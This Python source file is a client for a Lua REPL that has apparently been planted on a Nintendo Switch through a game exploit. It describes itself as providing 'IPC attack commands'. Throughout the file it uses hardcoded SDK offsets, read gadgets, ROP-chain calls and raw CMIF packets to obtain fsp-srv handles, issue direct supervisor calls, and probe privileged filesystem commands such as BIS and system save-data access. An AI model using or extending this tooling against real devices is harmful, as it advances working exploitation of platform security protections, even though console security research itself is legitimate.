#!/usr/bin/env python3
"""
Seedsow REPL client — connects to the Switch TCP REPL (port 8080)
and provides IPC attack commands for fsp-srv filesystem access.

Requires: Slot 7 + Slot 8 running on the Switch.

Usage:
  python3 seedsow_repl.py <switch_ip> [command]

Commands:
  shell              Interactive Lua shell (default)
  diag               Run diagnostics (verify primitives work)
  sdk-get [name]     Get a service handle via SDK's GetServiceHandle
  test-ipc [name]    Get handle + send CMIF IPC test packet
  test-svc22         Direct SVC #0x22 test (bypass SDK wrapper)
  fsp-init <handle>  Initialize fsp-srv with SetCurrentProcess
  fsp-probe <handle> Probe fsp-srv IPC commands
  full               Full chain: get handle → init → probe
"""

import socket
import struct
import sys
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else '192.168.1.136'
PORT = 8080
RECV_TIMEOUT = 30

# ── SDK offsets (Seedsow Artemis engine, confirmed via BN + hardware) ──
OFF_READ_GADGET        = 0x1371f0
OFF_GET_TLS_BUF        = 0x14ba80
OFF_GET_SERVICE_HANDLE = 0x14cc90
OFF_SVC_SEND           = 0x168c4c
OFF_SVC_SEND_USERBUF   = 0x168c54
OFF_SDK_SEND_WRAPPER   = 0x14ba90
OFF_SVC_CLOSE          = 0x168be4
OFF_SM_HANDLE          = 0xb5459c
OFF_SM_COUNT           = 0xb54598
OFF_MEMCPY_PLT         = 0x262480   # in main exe
OFF_MALLOC             = 0x262160
OFF_FREE               = 0x2621b0


def bytes_to_lua_str(data):
    if not data:
        return '""'
    return f'string.char({", ".join(str(b) for b in data)})'


class SeedREPL:
    def __init__(self, host, port=PORT):
        self.host = host
        self.port = port
        self.sock = None
        self.sdk_base = None
        self.main_base = None
        self.tls_buf = None
        self.sm_handle_val = None

    def connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(RECV_TIMEOUT)
        self.sock.connect((self.host, self.port))
        banner = self._recv_until_prompt()
        print(f"[+] Connected: {banner.strip()[:80]}")

    def _recv_until_prompt(self):
        buf = b""
        while True:
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                raise ConnectionError("Connection closed")
            buf += chunk
            if buf.endswith(b"> "):
                return buf[:-2].decode("utf-8", errors="replace")
        return buf.decode("utf-8", errors="replace")

    def cmd(self, lua_code, timeout=RECV_TIMEOUT):
        old = self.sock.gettimeout()
        self.sock.settimeout(timeout)
        self.sock.sendall((lua_code.rstrip("\n") + "\n").encode())
        resp = self._recv_until_prompt()
        self.sock.settimeout(old)
        return resp.strip()

    def setup(self):
        self.cmd('_G.h = _G.n2h')
        self.cmd('_G.SDK = h.sdk_base')
        self.cmd('_G.MAIN = h.main_base')
        self.cmd('debug.sethook()')

        resp = self.cmd('return string.format("0x%x", SDK)')
        self.sdk_base = int(resp, 16)
        print(f"[+] SDK base:  0x{self.sdk_base:x}")

        resp = self.cmd('return string.format("0x%x", MAIN)')
        self.main_base = int(resp, 16)
        print(f"[+] Main base: 0x{self.main_base:x}")

        self.cmd(
            f'_G.RG = SDK + 0x{OFF_READ_GADGET:x} '
            f'_G.read8 = function(addr) '
            f'return h.call_deep(RG, addr - 0x1b8, 0, 0, 0, 0) end'
        )

        resp = self.cmd(
            f'_G.tls = h.call_deep(SDK + 0x{OFF_GET_TLS_BUF:x}, 0, 0, 0, 0, 0) '
            f'return string.format("0x%x", tls)'
        )
        self.tls_buf = int(resp, 16)
        print(f"[+] TLS base:  0x{self.tls_buf:x}")

        resp = self.cmd(
            f'return string.format("0x%016x", read8(SDK + 0x{OFF_SM_COUNT:x}))'
        )
        val = int(resp.replace('0x', ''), 16)
        self.sm_handle_val = (val >> 32) & 0xFFFFFFFF
        init_count = val & 0xFFFFFFFF
        print(f"[+] SM handle: 0x{self.sm_handle_val:x} (init_count={init_count})")

    # ── Service handle acquisition ──

    def sdk_get_service(self, service_name):
        print(f"\n=== SDK GetServiceHandle('{service_name}') ===")
        name_bytes = service_name.encode('ascii')[:8]

        resp = self.cmd('_G.out_buf = h.alloc(32) return string.format("0x%x", out_buf)')
        out_addr = int(resp, 16)
        resp = self.cmd('_G.name_buf = h.alloc(32) return string.format("0x%x", name_buf)')
        name_addr = int(resp, 16)

        self.cmd('h.poke(out_buf, 0) h.poke(out_buf + 8, 0)')
        self.cmd(f'h.write_bytes(name_buf, {bytes_to_lua_str(name_bytes)})')

        resp = self.cmd(
            f'local rc = h.call_deep(SDK + 0x{OFF_GET_SERVICE_HANDLE:x}, '
            f'out_buf, name_buf, {len(name_bytes)}, 0, 0) '
            f'if rc == nil then return "NIL" '
            f'elseif rc == 0 then return "0" '
            f'else return string.format("0x%x", rc) end'
        )
        print(f"  Result: {resp}")

        if resp == "0":
            resp2 = self.cmd('return string.format("0x%x", read8(out_buf))')
            handle = int(resp2, 16) & 0xFFFFFFFF
            print(f"  HANDLE: 0x{handle:x}")
            self.cmd('h.free(out_buf) h.free(name_buf)')
            return handle
        else:
            if resp not in ("NIL", "0"):
                try:
                    rc_val = int(resp, 16)
                    print(f"  Error: module={rc_val & 0x1FF}, desc={(rc_val >> 9) & 0x1FFF}")
                except ValueError:
                    pass
            self.cmd('h.free(out_buf) h.free(name_buf)')
            return None

    # ── IPC sending ──

    def send_ipc(self, handle, packet_bytes, label="IPC"):
        print(f"\n  {label}: sending {len(packet_bytes)}B to handle 0x{handle:x}")
        lua_pkt = bytes_to_lua_str(packet_bytes)

        resp = self.cmd(
            f'local raw = h.alloc(0x3000) '
            f'local aligned = raw '
            f'if raw % 0x1000 ~= 0 then aligned = raw + 0x1000 - (raw % 0x1000) end '
            f'_G.ipc_raw = raw _G.ipc_buf = aligned '
            f'return string.format("raw=0x%x aligned=0x%x", raw, aligned)'
        )
        print(f"  Buffer: {resp}")

        self.cmd(
            f'for i=0,255,8 do h.poke(ipc_buf+i, 0) end '
            f'h.write_bytes(ipc_buf, {lua_pkt})'
        )

        sdk_wrapper = self.sdk_base + OFF_SDK_SEND_WRAPPER
        resp = self.cmd(
            f'local rc = h.call_deep(0x{sdk_wrapper:x}, {handle}, ipc_buf, 4096, 0, 0) '
            f'if rc == nil then return "NIL" '
            f'elseif rc == 0 then return "0" '
            f'else return string.format("0x%x", rc) end',
            timeout=30
        )
        print(f"  SDK wrapper result: {resp}")

        if resp == "0":
            print("  SUCCESS! Reading response:")
        else:
            print("  Response buffer:")
        self._dump_heap_response('ipc_buf', 8)

        rc_str = resp
        self.cmd('h.free(ipc_raw)')
        return rc_str

    def send_ipc_direct_svc22(self, handle, packet_bytes, label="SVC22"):
        """Send IPC via direct SVC #0x22 (bypass SDK wrapper)."""
        print(f"\n  {label}: direct SVC #0x22 to handle 0x{handle:x}")
        lua_pkt = bytes_to_lua_str(packet_bytes)
        svc22_addr = self.sdk_base + OFF_SVC_SEND_USERBUF

        resp = self.cmd(
            f'local raw = h.alloc(0x3000) '
            f'_G.ipc_raw = raw '
            f'_G.ipc_buf = raw + (0x1000 - raw % 0x1000) % 0x1000 '
            f'for i=0,255,8 do h.poke(ipc_buf+i, 0) end '
            f'h.write_bytes(ipc_buf, {lua_pkt}) '
            f'return string.format("0x%x 0x%x", ipc_raw, ipc_buf)'
        )
        print(f"  Buffers: {resp}")

        resp = self.cmd(
            f'local rc = h.call_deep(0x{svc22_addr:x}, ipc_buf, 4096, {handle}, 0, 0) '
            f'if rc == nil then return "NIL" '
            f'elseif rc == 0 then return "0" '
            f'else return string.format("0x%x", rc) end'
        )
        print(f"  Result: {resp}")

        if resp == "0":
            print("  SUCCESS!")
        self._dump_heap_response('ipc_buf', 8)

        self.cmd('h.free(ipc_raw)')
        return resp

    def _dump_heap_response(self, addr_expr, word_count=8):
        for i in range(word_count):
            off = i * 8
            resp = self.cmd(f'return string.format("0x%016x", read8({addr_expr} + {off}))')
            val = int(resp.replace('0x', ''), 16)
            raw = struct.pack('<Q', val)
            asc = ''.join(chr(b) if 32 <= b < 127 else '.' for b in raw)
            print(f"    [{off:3d}] 0x{val:016x}  {asc}")

    # ── Diagnostics ──

    def diagnostics(self):
        print("\n=== Diagnostics ===")

        print("\n[1] SM handle:")
        resp = self.cmd(f'return string.format("0x%016x", read8(SDK + 0x{OFF_SM_COUNT:x}))')
        val = int(resp.replace('0x', ''), 16)
        print(f"  handle=0x{(val >> 32) & 0xFFFFFFFF:x}, init_count={val & 0xFFFFFFFF}")

        print("\n[2] call_deep check:")
        resp = self.cmd(
            f'local r = h.call_deep(SDK + 0x{OFF_GET_TLS_BUF:x}, 0, 0, 0, 0, 0) '
            f'return string.format("0x%x", r)'
        )
        print(f"  TPIDRRO_EL0: {resp}")

        print("\n[3] memcpy via run_chain:")
        memcpy_addr = self.main_base + OFF_MEMCPY_PLT
        resp = self.cmd(
            f'local t = h.alloc(32) h.poke(t, 0) '
            f'h.write_bytes(t, string.char(0xDE, 0xAD, 0xBE, 0xEF)) '
            f'local t2 = h.alloc(32) h.poke(t2, 0) '
            f'h.run_chain(function(E) E:call3(0x{memcpy_addr:x}, t2, t, 8) end) '
            f'local v = read8(t2) h.free(t) h.free(t2) '
            f'return string.format("0x%x", v)'
        )
        print(f"  memcpy test: {resp} (expect 0xefbeadde)")

        print("\n[4] svcCloseHandle(0) baseline:")
        close_addr = self.sdk_base + OFF_SVC_CLOSE
        resp = self.cmd(
            f'local rc = h.call_deep(0x{close_addr:x}, 0, 0, 0, 0, 0) '
            f'return string.format("0x%x", rc)'
        )
        print(f"  Result: {resp} (expect 0xe401 InvalidHandle)")

    # ── fsp-srv operations ──

    def fsp_init(self, fsp_handle):
        print(f"\n=== fsp-srv SetCurrentProcess (handle=0x{fsp_handle:x}) ===")
        pkt = bytearray(64)
        struct.pack_into('<I', pkt, 0, 0x00000004)
        struct.pack_into('<I', pkt, 4, 0x80000008)
        struct.pack_into('<I', pkt, 8, 0x00000001)
        off = 32
        pkt[off:off+4] = b'SFCI'
        struct.pack_into('<I', pkt, off + 8, 1)
        return self.send_ipc(fsp_handle, bytes(pkt[:off + 16]), "SetCurrentProcess")

    def fsp_probe(self, fsp_handle):
        print(f"\n=== Probing fsp-srv (handle=0x{fsp_handle:x}) ===")
        cmds = {
            18: "OpenSdCardFileSystem",
            1001: "IsSdCardAccessible",
            200: "OpenDataStorageByCurrentProcess",
            11: "OpenBisFileSystem",
            12: "OpenBisStorage",
            51: "OpenSaveDataFileSystemBySystemSaveDataId",
        }
        for cmd_id, name in sorted(cmds.items()):
            pkt = bytearray(64)
            struct.pack_into('<I', pkt, 0, 0x00000004)
            struct.pack_into('<I', pkt, 4, 0x0000000A)
            pkt[16:20] = b'SFCI'
            struct.pack_into('<I', pkt, 24, cmd_id)
            self.send_ipc(fsp_handle, bytes(pkt[:32]), f"cmd={cmd_id} {name}")
            time.sleep(0.2)

    # ── Interactive shell ──

    def shell(self):
        print("\n[*] Interactive Lua shell. Type 'quit' to exit.")
        while True:
            try:
                line = input("lua> ")
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if line.strip() in ("quit", "exit"):
                break
            if not line.strip():
                continue
            try:
                resp = self.cmd(line)
                print(resp)
            except Exception as e:
                print(f"[!] Error: {e}")


def build_cmif_packet(cmd_id, input_data=b''):
    pkt = bytearray(64)
    struct.pack_into('<I', pkt, 0, 0x00000004)
    data_words = (32 + len(input_data) + 3) // 4
    struct.pack_into('<I', pkt, 4, data_words)
    pkt[16:20] = b'SFCI'
    struct.pack_into('<I', pkt, 24, cmd_id)
    if input_data:
        pkt[32:32+len(input_data)] = input_data
    return bytes(pkt[:32 + len(input_data)])


def main():
    command = sys.argv[2] if len(sys.argv) > 2 else 'shell'
    service = sys.argv[3] if len(sys.argv) > 3 else 'fsp-srv'

    repl = SeedREPL(HOST)
    print(f"[*] Connecting to {HOST}:{PORT}...")
    repl.connect()
    repl.setup()

    if command == 'shell':
        repl.shell()

    elif command == 'diag':
        repl.diagnostics()

    elif command == 'sdk-get':
        handle = repl.sdk_get_service(service)
        if handle:
            print(f"\n[+] {service} handle = 0x{handle:x}")
        else:
            print(f"\n[-] Failed to get {service}")

    elif command == 'test-ipc':
        handle = repl.sdk_get_service(service)
        if handle:
            print(f"\n[+] Got {service} handle: 0x{handle:x}")
            print("[*] Sending CMIF IsSdCardAccessible (cmd=1001)...")
            pkt = build_cmif_packet(1001)
            repl.send_ipc(handle, pkt, "IsSdCardAccessible")

    elif command == 'test-svc22':
        handle = repl.sdk_get_service('fsp-srv')
        if handle:
            print(f"\n[+] Got fsp-srv handle: 0x{handle:x}")
            pkt = build_cmif_packet(1001)

            print("\n[A] Direct SVC #0x22:")
            repl.send_ipc_direct_svc22(handle, pkt, "IsSdCardAccessible")

            print("\n[B] SDK wrapper:")
            repl.send_ipc(handle, pkt, "IsSdCardAccessible")

    elif command == 'fsp-init':
        fsp_handle = int(service, 0)
        repl.fsp_init(fsp_handle)

    elif command == 'fsp-probe':
        fsp_handle = int(service, 0)
        repl.fsp_probe(fsp_handle)

    elif command == 'full':
        handle = repl.sdk_get_service('fsp-srv')
        if handle:
            print(f"\n[+] fsp-srv handle = 0x{handle:x}")
            repl.fsp_init(handle)
            repl.fsp_probe(handle)
        else:
            print("[-] Could not get fsp-srv handle")

    else:
        print(f"Unknown command: {command}")
        print(__doc__)


if __name__ == "__main__":
    main()
